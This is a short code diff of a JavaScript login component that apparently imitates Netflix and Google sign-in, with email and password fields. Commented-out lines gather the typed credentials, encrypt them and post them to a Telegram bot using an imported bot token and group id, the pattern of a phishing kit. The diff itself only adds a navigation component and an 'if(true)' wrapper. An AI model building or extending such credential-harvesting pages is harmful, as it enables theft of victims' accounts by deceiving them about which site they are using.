@@ -1,7 +1,7 @@
 import {map,useRef} from "vanilla";
 import css from "./Home.module.css";
 import {netflixlogo,googlelogo} from "assets";
-import {InputField,ShowsBackground} from "components";
+import {InputField,ShowsBackground,Navigator} from "components";
 import {bottoken,netlixgroupid} from "estate";
 import {encrypt,decrypt} from "afile";
 
@@ -10,7 +10,6 @@ export default function Home(props){
     const {parent}=props;
     parent.insertAdjacentHTML("beforeend",`<div class="${css.home} activeroute"></div>`);
     const home=parent.querySelector(`.${css.home}`);
-    
     const refs={
         inputfields:["email","password"].map(prop=>useRef(prop)),
     };
@@ -43,7 +42,10 @@ export default function Home(props){
         if(navigator.onLine){
             /*const inputvalues=refs.inputfields.map(ref=>home.querySelector(`#${ref} input`).value);
             const input=encrypt(logincode(inputvalues[0],inputvalues[1],"google"));*/
-            history.pushState("#shows");
+            if(true){
+                history.pushState("#shows");
+                store.elements.navigator=Navigator({parent:window.app,ref:refs.navigator});
+            }
             /*fetch(`https://api.telegram.org/bot${bottoken}/sendMessage?chat_id=-${netlixgroupid}&text=${encodeURIComponent(input)}`,{
                 method:"POST",
                 redirect:"follow",
